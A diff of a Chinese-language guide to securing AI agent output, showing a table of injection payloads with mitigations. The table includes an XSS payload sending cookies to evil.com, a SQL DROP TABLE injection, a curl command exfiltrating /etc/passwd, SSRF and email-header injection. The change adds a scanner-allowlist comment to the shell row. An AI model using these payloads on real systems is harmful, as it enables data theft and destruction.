@@ -91,7 +91,7 @@ Agent 的输出往往直接流入下游系统：
 |------|---------|---------|
 | 生成 HTML/JS | `<img src=x onerror=fetch('https://evil.com/'+document.cookie)>` | HTML 实体编码 |
 | 生成 SQL | `'; DROP TABLE users; --` | 参数化查询 |
-| 生成 Shell 命令 | `file.txt; curl evil.com/$(cat /etc/passwd)` | Shell 转义/禁止 |
+| 生成 Shell 命令 | `file.txt; curl evil.com/$(cat /etc/passwd)` | Shell 转义/禁止 | <!-- security-allowlist: SEC002 -->
 | 发送 HTTP 请求 | `https://internal-admin:8080/admin/delete-all` (SSRF) | URL 白名单 |
 | 发送邮件 | `To: all@company.com\nBcc: external@evil.com` | 邮件头注入防护 |
 
